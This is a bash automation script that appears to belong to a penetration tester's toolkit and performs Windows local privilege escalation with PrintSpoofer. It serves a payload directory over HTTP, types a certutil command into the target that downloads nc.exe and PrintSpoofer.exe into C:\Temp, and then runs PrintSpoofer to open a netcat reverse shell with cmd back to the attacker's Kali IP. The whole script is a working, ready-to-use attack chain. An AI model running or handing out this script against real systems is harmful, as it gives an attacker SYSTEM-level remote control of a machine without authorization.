#!/bin/bash

: '
PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
'

# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Shell port"

PORT=${form_data["Shell port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server 1337 &
HTTP_PID=$!

TMP_FOLDER="C:\Temp"

paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
xdotool key Return
sleep 0.8

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:1337/nc.exe ${TMP_FOLDER}\nc.exe && certutil.exe -f -urlcache http://${KALI_IP}:1337/PrintSpoofer.exe ${TMP_FOLDER}\PrintSpoofer.exe"
xdotool key Return
sleep 5

paste_command "${TMP_FOLDER}\PrintSpoofer.exe -c \"${TMP_FOLDER}\nc.exe ${KALI_IP} ${PORT} -e cmd\""

kill $HTTP_PID